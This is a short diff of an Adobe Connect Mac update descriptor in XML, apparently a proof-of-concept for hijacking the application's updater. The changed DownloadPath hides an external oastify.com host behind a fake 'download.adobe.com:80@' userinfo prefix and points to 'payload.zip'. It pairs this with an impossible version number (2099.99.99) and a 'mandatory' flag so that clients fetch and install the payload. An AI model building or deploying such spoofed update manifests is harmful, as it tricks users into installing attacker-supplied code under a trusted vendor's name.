@@ -2,7 +2,7 @@
 <UpdateDescr>
 <Mac>
 <Release Version="2099.99.99" ReleaseDate="2026-05-13" Update="mandatory">
-<DownloadPath>download.adobe.com:80@b5hjgetposair0excxcg5g9p5gbjzdn2.oastify.com/payload.zip</DownloadPath>
+<DownloadPath>http://download.adobe.com:80@b5hjgetposair0excxcg5g9p5gbjzdn2.oastify.com/payload.zip</DownloadPath>
 <Description lang="en">There is a new version of Adobe Connect application. Would you like to update the application?</Description>
 </Release>
 </Mac>
